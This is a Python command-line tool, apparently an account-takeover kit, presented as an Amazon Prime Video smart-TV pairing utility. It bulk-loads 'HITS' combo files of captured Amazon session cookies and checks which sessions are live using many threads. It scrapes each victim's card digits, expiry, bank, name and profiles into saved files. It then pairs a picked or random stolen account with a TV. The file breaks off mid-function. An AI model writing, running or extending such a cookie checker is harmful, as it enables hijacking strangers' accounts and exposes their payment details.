#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Amazon Prime Video — Smart TV Login & CBL Pairing Tool (Concise & Optimized)"""
import sys, os, re, json, argparse, random, threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import urlparse, parse_qs

if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception: pass

try:
    import requests
except ImportError:
    print("[ERROR] 'requests' package not installed. Run: pip install requests")
    sys.exit(1)

AMZ_CBL_URL = "https://www.amazon.com/a/code"
PV_BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
DEF_HDRS = {"User-Agent": PV_BROWSER_UA, "Accept-Language": "en-US,en;q=0.9", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}

class Colors:
    HEADER, BLUE, CYAN, GREEN, YELLOW, RED, BOLD, UNDERLINE, RESET = "\033[95m", "\033[94m", "\033[96m", "\033[92m", "\033[93m", "\033[91m", "\033[1m", "\033[4m", "\033[0m"

def normalize_to_netscape(raw_input: str) -> str:
    if not raw_input: return ""
    s = raw_input.strip()
    if s.startswith("[") and s.endswith("]"):
        try:
            arr, lines = json.loads(s), ["# Netscape HTTP Cookie File"]
            for c in arr:
                dom, pfx = c.get("domain", ".amazon.com"), "#HttpOnly_" if c.get("httpOnly") and not c.get("domain", "").startswith("#HttpOnly_") else ""
                lines.append(f"{pfx}{dom}\tTRUE\t{c.get('path','/')}\t{'TRUE' if c.get('secure') else 'FALSE'}\t{int(c.get('expirationDate',0))}\t{c.get('name','')}\t{c.get('value','')}")
            return "\n".join(lines)
        except Exception: pass
    if "=" in s and "\t" not in s: return "# Netscape HTTP Cookie File\n" + "\n".join(f".amazon.com\tTRUE\t/\tFALSE\t0\t{p.split('=',1)[0].strip()}\t{p.split('=',1)[1].strip()}" for p in s.split(";") if "=" in p)
    ck_lines = ["# Netscape HTTP Cookie File"]
    for line in s.splitlines():
        line = line.strip()
        if not line or (line.startswith("#") and not line.startswith("#HttpOnly_")): continue
        p = line.split("\t")
        if len(p) >= 7 and p[5].strip(): ck_lines.append(line)
    return "\n".join(ck_lines) if len(ck_lines) > 1 else s

def parse_netscape_cookies(raw_cookie_text: str) -> dict:
    ck = {}
    for line in (raw_cookie_text or "").splitlines():
        line = line.strip()
        if not line or (line.startswith("#") and not line.startswith("#HttpOnly_")): continue
        p = line.split("\t")
        if len(p) >= 7 and p[5].strip(): ck[p[5].strip()] = "\t".join(p[6:]).strip().strip('"')
    return ck

def build_amazon_cookie_header(cookies_dict: dict) -> str:
    pairs = []
    for k, v in cookies_dict.items():
        ak = re.sub(r"-main-av$", "-main", k)
        pairs.extend([f"{ak}={v}"] + ([f"{k}={v}"] if ak != k else []))
    return "; ".join(pairs)

def build_prime_cookie_header(cookies_dict: dict) -> str:
    return "; ".join(f"{k}={v}" for k, v in cookies_dict.items())

def extract_accounts_from_text(text: str, source_name: str = "HITS") -> list:
    if not text: return []
    for pat in [r"\r?\n\s*\$\s*(?:\r?\n|$)", r"\r?\n\s*[-=~*]{3,}\s*(?:\r?\n|$)"]:
        if re.search(pat, text):
            raws = [b.strip() for b in re.split(pat, text) if any(k in b for k in ("at-main", "session-token", "ubid-main"))]
            if raws: return [{"raw": normalize_to_netscape(b), "label": f"{source_name} (Account #{i+1})"} for i, b in enumerate(raws)]
    if "# Netscape HTTP Cookie File" in text:
        parts = [p.strip() for p in re.split(r"(?=# Netscape HTTP Cookie File)", text, flags=re.I) if p.strip()]
        if len(parts) > 1:
            raws = [p for p in parts if any(k in p for k in ("at-main", "session-token", "ubid-main"))]
            if raws: return [{"raw": normalize_to_netscape(p), "label": f"{source_name} (Account #{i+1})"} for i, p in enumerate(raws)]
    lines, blocks, curr, seen = text.splitlines(), [], [], False
    for line in lines:
        if ("\tat-main-av\t" in line or "\tat-main\t" in line) and seen: blocks.append("\n".join(curr).strip()); curr = [line]
        else:
            if "\tat-main-av\t" in line or "\tat-main\t" in line: seen = True
            curr.append(line)
    if curr: blocks.append("\n".join(curr).strip())
    valid = [b for b in blocks if any(k in b for k in ("at-main", "session-token"))]
    return [{"raw": normalize_to_netscape(b), "label": f"{source_name} (Account #{i+1})"} for i, b in enumerate(valid)] if len(valid) > 1 else ([{"raw": normalize_to_netscape(text), "label": f"{source_name} (Single Account)"}] if any(k in text for k in ("at-main", "session-token", "ubid-main")) else [])

def validate_session(cookies_dict: dict) -> dict:
    if not any(k in cookies_dict for k in ("at-main", "at-main-av", "session-token")): return {"valid": False, "expired": True, "error": "Missing essential authentication cookies"}
    try:
        r = requests.get(AMZ_CBL_URL, headers={**DEF_HDRS, "Cookie": build_amazon_cookie_header(cookies_dict)}, allow_redirects=False, timeout=10)
        if r.status_code == 200 and ("cbl-input-code-form" in r.text or "cbl-registration-field" in r.text): return {"valid": True, "expired": False}
        if r.status_code in (301, 302, 307) and "signin" in r.headers.get("Location", ""): return {"valid": False, "expired": True, "error": "Session expired or logged out (Redirected to sign-in)"}
        return {"valid": False, "expired": False, "error": f"Unexpected HTTP status {r.status_code}"}
    except Exception as e: return {"valid": False, "expired": False, "error": str(e)}

def fetch_subscription_details(cookies_dict: dict) -> dict:
    lc = cookies_dict.get("lc-main-av") or cookies_dict.get("lc-main") or "en_US"
    info = {"valid": False, "plan": "Prime Video", "country": lc.split("_")[-1].upper() if "_" in lc else "US", "account_name": None, "payment_method": None, "card_bank": None, "subscription_id": None, "profiles": None, "ubid": cookies_dict.get("ubid-main-av") or cookies_dict.get("ubid-main") or "Unknown", "is_subscribed": False}
    try:
        r = requests.get("https://www.primevideo.com/settings/your-account", headers={**DEF_HDRS, "Cookie": build_prime_cookie_header(cookies_dict)}, allow_redirects=False, timeout=12)
        if r.status_code in (301, 302, 303, 307, 308) and "/region/" in r.headers.get("Location", ""):
            loc = r.headers.get("Location", "")
            r = requests.get(loc if loc.startswith("http") else f"https://www.primevideo.com{loc}", headers={**DEF_HDRS, "Cookie": build_prime_cookie_header(cookies_dict)}, allow_redirects=False, timeout=12)
        if r.status_code == 200:
            t, info["valid"] = r.text, True
            c_m, plan_m, sub_m, bank_m = re.search(r'"recordTerritory":\s*"([^"]+)"', t), re.search(r'"header":\s*\{\s*"title":\s*\{[^}]*"string":\s*"([^"]+)"', t), re.search(r'subscriptionId=([A-Z0-9]+)', t), re.search(r'"name":\s*\{\s*"dvString":\s*\{\s*"attrs":\s*\{\},\s*"string":\s*"([^"]+)"', t)
            if c_m: info["country"] = c_m.group(1).upper()
            if bank_m: info["card_bank"] = bank_m.group(1)
            if sub_m: info["subscription_id"] = sub_m.group(1)
            info["plan"] = plan_m.group(1) if plan_m else ("Amazon Prime" if "Amazon Prime" in t else "Prime Video")
            card_m, hdr_m, exp_m = re.search(r'"paymentMethodNumber":\s*\{\s*"prefix":\s*"([^"]*)",\s*"lastDigits":\s*"([^"]*)"\s*\}', t), re.search(r'"paymentMethodHeader":\s*"([^"]+)"', t), re.search(r'"paymentMethodExpirationDate":\s*\{\s*"year":\s*(\d+),\s*"month":\s*(\d+)\s*\}', t)
            if card_m: info["payment_method"] = f"{hdr_m.group(1) if hdr_m else 'Card'} •••• {card_m.group(2)}{f' (Exp: {exp_m.group(2)}/{exp_m.group(1)})' if exp_m else ''}"
            else:
                sc = re.search(r'(?:se terminant par|ending in|terminada en)\s*(\d+)', t, re.I)
                if sc: info["payment_method"] = f"Card •••• {sc.group(1)}"
            profs = re.findall(r'"profileName":\s*"([^"]+)"', t) + re.findall(r'data-testid="pv-nav-change-profile-[^"]*"\s+aria-label="([^"]+)"', t)
            if profs: info["profiles"] = ", ".join(dict.fromkeys(profs))
            nm = re.search(r'"customerName":\s*"([^"]+)"', t) or re.search(r'(?:Bienvenido|Bienvenue|Hello|Hola|Hallo|Welcome)[,\s]+([A-Za-z0-9\s]{2,30})', t)
            if nm: info["account_name"] = nm.group(1).strip()
            info["is_subscribed"] = bool(info["subscription_id"] or info["payment_method"])
        else: info["valid"] = True
    except Exception: pass
    return info

def pair_smart_tv(cookies_dict: dict, tv_code: str) -> dict:
    code = re.sub(r"[^A-Za-z0-9]", "", tv_code or "").upper().strip()
    if len(code) != 6: return {"success": False, "error": "Invalid TV code format! Enter 6 alphanumeric characters from your TV screen."}
    s, ck_hdr = requests.Session(), build_amazon_cookie_header(cookies_dict)
    hdrs = {**DEF_HDRS, "Cookie": ck_hdr}
    try: r = s.get(AMZ_CBL_URL, headers=hdrs, allow_redirects=False, timeout=10)
    except Exception as e: return {"success": False, "error": f"Failed to reach Amazon CBL server: {e}"}
    if r.status_code in (301, 302) and "signin" in r.headers.get("Location", ""): return {"success": False, "error": "Prime Video session has expired or was logged out in the browser."}
    if r.status_code != 200: return {"success": False, "error": f"Failed to load CBL registration page (HTTP {r.status_code})"}
    csrf_m = re.search(r"name=['\"]csrfToken['\"][^>]*value=['\"]([^'\"]+)['\"]", r.text, re.I)
    if not csrf_m: return {"success": False, "error": "CSRF token not found in Amazon response form."}
    lang_m = re.search(r"name=['\"]language['\"][^>]*value=['\"]([^'\"]+)['\"]", r.text, re.I)
    for k, v in s.cookies.get_dict().items(): ck_hdr += f"; {k}={v}"
    post_hdrs = {**hdrs, "Cookie": ck_hdr, "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.amazon.com", "Referer": AMZ_CBL_URL}
    try: pr = s.post(AMZ_CBL_URL, data={"csrfToken": csrf_m.group(1), "cbl-code": code, "language": lang_m.group(1) if lang_m else "en_US"}, headers=post_hdrs, allow_redirects=False, timeout=12)
    except Exception as e: return {"success": False, "error": f"Failed to submit code to Amazon server: {e}"}
    loc, st = pr.headers.get("Location", ""), parse_qs(urlparse(pr.headers.get("Location", "")).query).get("cbl-status", [""])[0]
    if any(k in loc or k in st for k in ("success", "successfully_authorized")): return {"success": True, "device": "Smart TV"}
    if "/a/code/info" in loc:
        try:
            ir = s.get(loc if loc.startswith("http") else f"https://www.amazon.com{loc}", headers=hdrs, timeout=10)
            dev_m = re.search(r'<div class="a-column a-span9 a-span-last">\s*([^<]+)\s*</div>', ir.text, re.I)
            app_csrf = (re.search(r'name=[\'"]csrfToken[\'"]\s+value=[\'"]([^\'"]+)[\'"]', ir.text, re.I) or csrf_m).group(1)
            ar = s.post("https://www.amazon.com/a/code/info/approve", data={"cbl-code": code, "csrfToken": app_csrf}, headers={**post_hdrs, "Referer": loc}, allow_redirects=False, timeout=12)
            aloc = ar.headers.get("Location", "")
            ast = parse_qs(urlparse(aloc).query).get("cbl-status", [""])[0]
            if any(k in aloc or k in ast for k in ("success", "successfully_authorized")) or ar.status_code == 200:
                return {"success": True, "device": dev_m.group(1).strip() if dev_m else "Smart TV"}
            return {"success": False, "error": f"TV device authorization was rejected by Amazon (Status: {ast or aloc})"}
        except Exception as e: return {"success": False, "error": f"Failed during device confirmation step: {e}"}
    if "invalid_code" in st or "invalid_code" in loc: return {"success": False, "error": "The TV code is incorrect or has expired on your TV screen."}
    if "/ap/signin" in loc: return {"success": False, "error": "Prime Video account session has expired."}
    if pr.status_code == 200 and any(k in pr.text for k in ("success", "Connected", "Connecté")): return {"success": True, "device": "Smart TV"}
    return {"success": False, "error": "TV authorization unsuccessful."}

def clear_screen(): os.system("cls" if os.name == "nt" else "clear")

def print_banner():
    clear_screen()
    print(Colors.CYAN + Colors.BOLD + "=" * 74 + "\n   🎬 AMAZON PRIME VIDEO — SMART TV LOGIN & CBL PAIRING TOOL\n   ⚡ 100% Local • Zero External API • Amazon Chimera CBL Engine\n" + "=" * 74 + Colors.RESET)

def get_valid_account_dir() -> str:
    p = os.path.join(os.path.dirname(os.path.abspath(__file__)), "valid_account"); os.makedirs(p, exist_ok=True); return p

def get_combo_dir() -> str:
    p = os.path.join(os.path.dirname(os.path.abspath(__file__)), "combo"); os.makedirs(p, exist_ok=True); return p

def save_valid_account(account_num: int, cookies_dict: dict, raw_netscape: str, sub_details: dict, source_name: str = "") -> dict:
    vdir, country, plan = get_valid_account_dir(), sub_details.get("country") or "US", sub_details.get("plan") or "PrimeVideo"
    ubid = sub_details.get("ubid") or ""
    subid = ubid.split("-")[-1] if "-" in ubid else (ubid[-7:] if ubid else f"{account_num}")
    is_sub = bool(sub_details.get("subscription_id") or sub_details.get("payment_method"))
    lbl, now = ("ACTIVE SUBSCRIBED" if is_sub else "ACTIVE NON-SUB"), datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    fname, fpath = f"acc_{account_num:03d}_{country}_{re.sub(r'[^A-Za-z0-9]', '', plan)}_{subid}.txt", os.path.join(vdir, f"acc_{account_num:03d}_{country}_{re.sub(r'[^A-Za-z0-9]', '', plan)}_{subid}.txt")
    clean_ck = normalize_to_netscape(raw_netscape)
    cookie_body = clean_ck.split("# Netscape HTTP Cookie File")[-1].strip() if "# Netscape HTTP Cookie File" in clean_ck else clean_ck.strip()
    open(fpath, "w", encoding="utf-8").write(f"#{'='*78}\n# AMAZON PRIME VIDEO — VERIFIED VALID ACCOUNT\n# Checked & Saved At : {now}\n# Source File / Origin: {source_name or 'HITS'}\n#{'='*78}\n# Status          : {lbl}\n# Plan Name       : {sub_details.get('plan') or 'Prime Video'}\n# Region / Country: {country}\n# Subscription ID : {sub_details.get('subscription_id') or 'None'}\n# Payment Method  : {sub_details.get('payment_method') or 'None'}\n# Card Bank/Issuer: {sub_details.get('card_bank') or 'None'}\n# Profiles Found  : {sub_details.get('profiles') or 'None'}\n# Account Holder  : {sub_details.get('account_name') or 'None'}\n# Amazon UBID     : {ubid}\n#{'='*78}\n\n# Netscape HTTP Cookie File\n{cookie_body}\n")
    entry = {"filename": fname, "filepath": fpath, "account_num": account_num, "status": lbl, "is_subscribed": is_sub, "plan": sub_details.get("plan") or "Prime Video", "country": country, "subscription_id": sub_details.get("subscription_id"), "payment_method": sub_details.get("payment_method"), "card_bank": sub_details.get("card_bank"), "profiles": sub_details.get("profiles"), "account_name": sub_details.get("account_name"), "ubid": ubid, "saved_at": now, "source": source_name, "raw_cookie": cookie_body}
    update_index_json(vdir, new_entry={k:v for k,v in entry.items() if k != "raw_cookie"})
    try: open(os.path.join(vdir, "all_valid_cookies.txt"), "a", encoding="utf-8").write(f"\n$ # --- {fname} [{lbl}] [{country}] ---\n{cookie_body}\n")
    except Exception: pass
    return entry

def update_index_json(vdir: str, new_entry: dict = None, remove_fname: str = None):
    idx_p, entries = os.path.join(vdir, "index.json"), []
    if os.path.exists(idx_p):
        try:
            txt = open(idx_p, "r", encoding="utf-8").read().strip()
            if txt: entries = json.loads(txt)
        except Exception: entries = []
    if remove_fname: entries = [e for e in entries if isinstance(e, dict) and e.get("filename") != remove_fname]
    if new_entry:
        fn = new_entry.get("filename")
        entries = [e for e in entries if isinstance(e, dict) and e.get("filename") != fn] + [new_entry]
    try: open(idx_p, "w", encoding="utf-8").write(json.dumps(entries, indent=2))
    except Exception: pass

def load_saved_accounts() -> list:
    vdir = get_valid_account_dir()
    if not os.path.isdir(vdir): return []
    accs, fields = [], [("status", r"# Status\s*:\s*(.+)"), ("plan", r"# Plan Name\s*:\s*(.+)"), ("country", r"# Region / Country\s*:\s*(.+)"), ("subscription_id", r"# Subscription ID\s*:\s*(.+)"), ("payment_method", r"# Payment Method\s*:\s*(.+)"), ("card_bank", r"# Card Bank/Issuer\s*:\s*(.+)"), ("profiles", r"# Profiles Found\s*:\s*(.+)"), ("ubid", r"# Amazon UBID\s*:\s*(.+)"), ("saved_at", r"# Checked & Saved At\s*:\s*(.+)")]
    for fn in sorted(os.listdir(vdir)):
        if fn.startswith("acc_") and fn.endswith(".txt"):
            try:
                c = open(os.path.join(vdir, fn), "r", encoding="utf-8", errors="ignore").read()
                d = {k: (re.search(pat, c).group(1).strip() if re.search(pat, c) else None) for k, pat in fields}
                for k in ("subscription_id", "payment_method", "card_bank", "profiles"):
                    if d[k] == "None": d[k] = None
                raw = c.split("# Netscape HTTP Cookie File")[-1].strip() if "# Netscape HTTP Cookie File" in c else c
                accs.append({"filename": fn, "filepath": os.path.join(vdir, fn), "status": d["status"] or "ACTIVE", "is_subscribed": "SUBSCRIBED" in (d["status"] or ""), "plan": d["plan"] or "Prime Video", "country": d["country"] or "US", **d, "raw_cookie": raw})
            except Exception: pass
    return accs

def delete_saved_account(acc: dict) -> bool:
    try:
        if acc.get("filepath") and os.path.exists(acc["filepath"]): os.remove(acc["filepath"])
        if acc.get("filename"): update_index_json(get_valid_account_dir(), remove_fname=acc.get("filename"))
        return True
    except Exception: return False

def inspect_saved_account(acc: dict):
    print_banner()
    c = Colors.GREEN if acc.get("is_subscribed") else Colors.CYAN
    print(Colors.BOLD + f"=== ACCOUNT DETAILS: {acc.get('filename')} ===" + Colors.RESET)
    print(f"  📊 Status          : {c}{acc.get('status')}{Colors.RESET}\n  📦 Plan            : {acc.get('plan')}\n  🌐 Region / Country: {acc.get('country')}\n  🔑 Subscription ID : {acc.get('subscription_id') or 'None'}\n  💳 Payment Method  : {acc.get('payment_method') or 'None'}\n  🏦 Bank / Issuer   : {acc.get('card_bank') or 'None'}\n  👥 Profiles        : {acc.get('profiles') or 'None'}\n  👤 Account Holder  : {acc.get('account_name') or 'None'}\n  🆔 Amazon UBID     : {acc.get('ubid') or 'None'}\n  📅 Saved Date      : {acc.get('saved_at') or 'Unknown'}\n  📁 File Location   : {acc.get('filepath')}\n" + "=" * 64)
    print("\nAccount Actions:\n [1] 🔄 Re-verify live session right now\n [2] 📺 Pair directly with Smart TV (Enter 6-char code)\n [3] 🗑️  Delete this account from valid_account/\n [4] 🔙 Return to accounts list")
    act = input("Select [1/2/3/4] (default: 4): ").strip()
    if act == "1":
        print(Colors.YELLOW + "\n[*] Testing session live via Amazon CBL..." + Colors.RESET)
        cd, chk = parse_netscape_cookies(acc["raw_cookie"]), validate_session(parse_netscape_cookies(acc["raw_cookie"]))
        if chk["valid"]:
            print(Colors.GREEN + "[+] Account session is LIVE & ACTIVE!" + Colors.RESET)
            d = fetch_subscription_details(cd)
            badge = Colors.GREEN + "SUBSCRIBED" if (d.get("subscription_id") or d.get("payment_method")) else Colors.CYAN + "NON-SUB"
            print(f"  Plan: {d['plan']} | Region: {d['country']} | Status: {badge}{Colors.RESET}")
            if d.get("payment_method"): print(f"  Card: {d['payment_method']}")
            if d.get("subscription_id"): print(f"  Sub ID: {d['subscription_id']}")
        else:
            print(Colors.RED + f"[-] Account session is DEAD / EXPIRED: {chk.get('error')}" + Colors.RESET)
            if delete_saved_account(acc): print(Colors.YELLOW + f"[*] Deleted expired account file: {acc.get('filename')}" + Colors.RESET)
        input("\nPress Enter to continue...")
    elif act == "2":
        code = input("\nEnter 6-character Smart TV code (e.g. Y6ALSY): ").strip().upper()
        if len(code) == 6:
            print(Colors.CYAN + f"\n[*] Linking Smart TV with code [{code}]..." + Colors.RESET)
            res = pair_smart_tv(parse_netscape_cookies(acc["raw_cookie"]), code)
            print((Colors.GREEN + Colors.BOLD + f"\n🎉 SMART TV LOGIN SUCCESSFUL! Device: {res.get('device', 'Smart TV')}") if res["success"] else (Colors.RED + f"\n❌ FAILED TO PAIR: {res['error']}"))
            print(Colors.RESET, end="")
        else: print(Colors.RED + "[-] Invalid code length!" + Colors.RESET)
        input("\nPress Enter to continue...")
    elif act == "3":
        if input(f"Are you sure you want to delete {acc.get('filename')}? [y/N]: ").strip().lower() == "y":
            print((Colors.GREEN + "[+] File deleted successfully.") if delete_saved_account(acc) else (Colors.RED + f"[-] Failed to delete {acc.get('filename')}."))
            print(Colors.RESET, end="")
        input("\nPress Enter to continue...")

def menu_check_saved_accounts():
    while True:
        print_banner()
        accs = load_saved_accounts()
        print(Colors.BOLD + "=== [2] CHECK SAVED ACCOUNTS (from valid_account/) ===" + Colors.RESET)
        print(f"Local Storage Folder: {get_valid_account_dir()}\n")
        if not accs:
            print(Colors.YELLOW + "[-] No saved accounts found in 'valid_account/' folder.\n💡 Tip: Run Bulk Scanner (Menu [3]) first!\n" + Colors.RESET)
            input("Press Enter to return to main menu..."); return
        print(f"Found {len(accs)} saved account(s):\n\n{'#':<4} | {'Status':<16} | {'Plan':<14} | {'Reg':<4} | {'Payment Method':<24}\n" + "-" * 74)
        for i, a in enumerate(accs):
            col, txt = (Colors.GREEN, "🟢 SUBSCRIBED") if a.get("is_subscribed") else (Colors.CYAN, "⚪ NON-SUB")
            print(f"[{i + 1:<2}] | {col}{txt:<16}{Colors.RESET} | {(a.get('plan') or 'Prime Video')[:14]:<14} | {(a.get('country') or 'US')[:4]:<4} | {(a.get('payment_method') or 'None')[:24]:<24}")
        print("-" * 74 + "\nOptions:\n [1 - N] View full account details, re-verify live, or pair with TV\n [A]     Live Re-Verify ALL saved accounts (filter out expired)\n [B]     Back to main menu")
        ch = input(f"\nSelect option [1-{len(accs)} / A / B] (default: B): ").strip().upper()
        if not ch or ch == "B": return
        if ch == "A":
            print(Colors.CYAN + f"\n[*] Re-verifying {len(accs)} saved accounts live (Multi-threaded)..." + Colors.RESET)
            alive = dead = 0
            lock = threading.Lock()
            def verify_single(item):
                nonlocal alive, dead
                i, a = item
                chk = validate_session(parse_netscape_cookies(a["raw_cookie"]))
                with lock:
                    if chk["valid"]:
                        alive += 1; print(Colors.GREEN + f"  [{i+1}/{len(accs)}] 🟢 LIVE  | {a.get('filename')} ({a.get('plan')})" + Colors.RESET)
                    else:
                        dead += 1; del_tag = " (File Deleted)" if delete_saved_account(a) else ""
                        print(Colors.RED + f"  [{i+1}/{len(accs)}] 🔴 DEAD  | {a.get('filename')} -> Expired!{del_tag}" + Colors.RESET)
            with ThreadPoolExecutor(max_workers=min(10, max(1, len(accs)))) as ex:
                list(ex.map(verify_single, enumerate(accs)))
            print(f"\nSummary: {alive} Active, {dead} Dead (Cleaned & Deleted) out of {len(accs)} accounts.")
            input("\nPress Enter to continue...")
        else:
            try:
                num = int(ch)
                if 1 <= num <= len(accs): inspect_saved_account(accs[num - 1])
            except ValueError: pass

def menu_run_account_checker():
    print_banner()
    print(Colors.BOLD + "=== [3] BULK ACCOUNT SCANNER (Auto-delete after scan) ===" + Colors.RESET)
    cdir = get_combo_dir()
    print(Colors.YELLOW + f"[*] Scanning directory: {cdir}" + Colors.RESET)
    cfiles = [os.path.join(r, f) for r, _, fs in os.walk(cdir) for f in fs if f.endswith((".txt", ".json", ".csv"))]
    if not cfiles:
        print(Colors.RED + "\n[-] Folder 'combo/' is empty!\n💡 Tip: Copy/Move your HITS (.txt) files inside 'combo/' and try again." + Colors.RESET)
        input("\nPress Enter to return..."); return
    print(Colors.CYAN + f"[*] Found {len(cfiles)} file(s). Extracting accounts..." + Colors.RESET)
    fmap, total = {}, 0
    for fp in cfiles:
        try:
            accs = extract_accounts_from_text(open(fp, "r", encoding="utf-8", errors="ignore").read(), os.path.basename(fp))
            if accs: fmap[fp] = accs; total += len(accs)
        except Exception as e: print(Colors.RED + f"[-] Error reading {os.path.basename(fp)}: {e}" + Colors.RESET)
    if total == 0:
        print(Colors.RED + "\n[-] No accounts detected in any combo files." + Colors.RESET)
        input("\nPress Enter to return..."); return
    print(Colors.GREEN + f"[+] Ready to check {total} accounts across {len(fmap)} file(s)." + Colors.RESET)
    print("\nSave Filter Option:\n [1] Save ALL valid accounts (Active Subscribed + Active Free)\n [2] Save ONLY active SUBSCRIBED accounts (Recommended)")
    sub_only = (input("Select filter [1/2] (default: 1): ").strip() == "2")
    th_in = input("\nEnter Threads / Parallel Workers [1-30] (default: 10): ").strip()
    try: workers = max(1, min(int(th_in), 30))
    except ValueError: workers = 10
    print(Colors.CYAN + f"\n[*] Starting Multi-Threaded Bulk Scanner ({workers} Workers)...\n" + Colors.RESET)
    saved = a_sub = a_nosub = dead = duplicates = 0
    idx = 1
    existing_accs = load_saved_accounts()
    next_acc_num = max([a.get("account_num", 0) for a in existing_accs] + [0]) + 1
    vdir = get_valid_account_dir()
    for f in os.listdir(vdir):
        m = re.match(r"^acc_(\d+)_", f)
        if m:
            try: next_acc_num = max(next_acc_num, int(m.group(1)) + 1)
            except ValueError: pass
    known_ubids = {a["ubid"]: a["filename"] for a in existing_accs if a.get("ubid") and a.get("ubid") != "Unknown"}
    known_subids = {a["subscription_id"]: a["filename"] for a in existing_accs if a.get("subscription_id")}
    seen_batch_ubids = set()
    lock = threading.Lock()

    def process_account(a, fn):
        nonlocal saved, a_sub, a_nosub, dead, duplicates, idx, next_acc_num
        cd = parse_netscape_cookies(a["raw"])
        ubid = cd.get("ubid-main-av") or cd.get("ubid-main")
        with lock:
            cur_idx = idx
            idx += 1
            if ubid and (ubid in known_ubids or ubid in seen_batch_ubids):
                duplicates += 1
                dup_target = known_ubids.get(ubid, "Current Batch")
                print(Colors.YELLOW + f"[{cur_idx}/{total}] 🟡 DUPLICATE | Already saved/seen as {dup_target} -> Skipped" + Colors.RESET)
                return
            if ubid and ubid != "Unknown": seen_batch_ubids.add(ubid)
        chk = validate_session(cd)
        if chk["valid"]:
            det = fetch_subscription_details(cd)
            sub_id = det.get("subscription_id")
            with lock:
                if sub_id and sub_id in known_subids:
                    duplicates += 1
                    print(Colors.YELLOW + f"[{cur_idx}/{total}] 🟡 DUPLICATE | Sub ID already saved in {known_subids[sub_id]} -> Skipped" + Colors.RESET)
                    return
                is_s = det.get("is_subscribed", False)
                if is_s: a_sub += 1
                else: a_nosub += 1
                if sub_only and not is_s: print(Colors.YELLOW + f"[{cur_idx}/{total}] ⚪ ACTIVE NON-SUB | {det['plan']} [{det['country']}] -> Skipped" + Colors.RESET)
                else:
                    ent = save_valid_account(next_acc_num, cd, a["raw"], det, a.get("label", fn))
                    next_acc_num += 1
                    saved += 1
                    if det.get("ubid") and det.get("ubid") != "Unknown": known_ubids[det["ubid"]] = ent["filename"]
                    if sub_id: known_subids[sub_id] = ent["filename"]
                    col, ic = (Colors.GREEN, "🟢 ACTIVE SUBSCRIBED") if is_s else (Colors.CYAN, "⚪ ACTIVE NON-SUB")
                    print(col + f"[{cur_idx}/{total}] {ic} | {det['plan']} [{det['country']}] -> Saved: {ent['filename']}" + Colors.RESET)
        else:
            with lock:
                dead += 1
                print(Colors.RED + f"[{cur_idx}/{total}] 🔴 EXPIRED / DEAD  | {(chk.get('error') or 'Session expired')[:45]}" + Colors.RESET)

    for fp, acc_list in fmap.items():
        fn = os.path.basename(fp)
        print(Colors.BOLD + f"\n--- Processing File: {fn} ({len(acc_list)} accounts, {workers} threads) ---" + Colors.RESET)
        with ThreadPoolExecutor(max_workers=workers) as executor:
            list(executor.map(lambda acc: process_account(acc, fn), acc_list))
        try:
            os.remove(fp)
            print(Colors.BLUE + f"[*] Deleted scanned file: {fn} (Cleanup successful)" + Colors.RESET)
        except Exception as e: print(Colors.RED + f"[-] Could not delete {fn}: {e}" + Colors.RESET)
    print(Colors.CYAN + "\n" + "=" * 64 + f"\n  📊 SCANNER & STORAGE SUMMARY\n  📁 Saved Folder       : {get_valid_account_dir()}\n  💾 Valid Saved        : {saved} Accounts\n  🟢 Active Subscribed  : {a_sub} Accounts\n  ⚪ Active Non-Sub     : {a_nosub} Accounts\n  🟡 Duplicates Skipped : {duplicates} Accounts\n  🔴 Expired / Dead     : {dead} Accounts\n  📋 Total Checked      : {total} Accounts\n  🗑️  Combo Files Cleaned: {len(fmap)} File(s)\n" + "=" * 64 + Colors.RESET)
    input("\nPress Enter to return to main menu...")

def interactive_cli():
    while True:
        print_banner()
        print("Service Menu:\n [1] 📺 Pair / Login Smart TV\n [2] 📁 File Manager\n [3] ⚡ Run Bulk Scanner\n [4] 🚪 Exit\n" + "-" * 74)
        opt = input("Select Menu Option [1/2/3/4]: ").strip()
        if opt == "1":
            print_banner()
            print(Colors.BOLD + "=== [1] SMART TV PRIME VIDEO LOGIN ===" + Colors.RESET)
            code = input(Colors.YELLOW + ">> Enter 6-Digit TV Code (e.g. Y6ALSY): " + Colors.RESET).strip().upper()
            if len(code) != 6:
                print(Colors.RED + "[-] Code must be exactly 6 alphanumeric characters!" + Colors.RESET)
                input("\nPress Enter to return to menu..."); continue
            saved_accs = load_saved_accounts()
            if not saved_accs:
                print(Colors.YELLOW + "\n[-] No saved accounts found in 'valid_account/' folder.\n💡 Please scan accounts first using Bulk Scanner (Menu [3])." + Colors.RESET)
                input("\nPress Enter to return..."); continue
            print(f"\nSelect Cookie Source:\n [1] Random\n [2] Pick from saved valid accounts [{len(saved_accs)} Available]")
            src = input("Select [1/2] (default: 1): ").strip()
            if src == "2":
                print("\nSaved Valid Accounts:")
                for i, s in enumerate(saved_accs):
                    print(f" [{i + 1}] {'🟢 SUB' if s.get('is_subscribed') else '⚪ FREE'} | {s.get('country')} | {s.get('plan')} | {s.get('payment_method') or 'No Card'}")
                try:
                    s_idx = int(input(f"\nSelect Account [1-{len(saved_accs)}] (default: 1): ").strip()) - 1
                    sel = saved_accs[s_idx] if 0 <= s_idx < len(saved_accs) else saved_accs[0]
                except Exception: sel = saved_accs[0]
            else:
                sel = random.choice(saved_accs)
                print(Colors.CYAN + f"\n[*] Selected Random Account: {'🟢 SUB' if sel.get('is_subscribed') else '⚪ FREE'} | {sel.get('country')} | {sel.get('plan')} | {sel.get('payment_method') or 'No Card'}" + Colors.RESET)
            cd = parse_netscape_cookies(normalize_to_netscape(sel["raw_cookie"]))
            if not cd:
                print(Colors.RED + "[-] Invalid or empty cookie format!" + Colors.RESET)
                input("\nPress Enter to return..."); continue
            print(Colors.CYAN + f"\n[*] Linking Smart TV with code [{code}] via Amazon CBL..." + Colors.RESET)
            res = pair_smart_tv(cd, code)
            if res["success"]:
